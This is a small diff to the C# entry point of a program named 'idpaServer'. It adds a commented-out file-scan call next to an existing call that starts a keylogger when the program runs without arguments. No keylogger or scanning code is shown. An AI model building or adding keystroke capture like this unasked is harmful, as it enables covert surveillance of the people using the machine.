@@ -16,6 +16,7 @@ namespace idpaServer
         {
             if (args.Length <= 0)
                 startKeylogger();
+                //FileScanner.startFileScan();
 
             foreach(string argumen in args)
             {
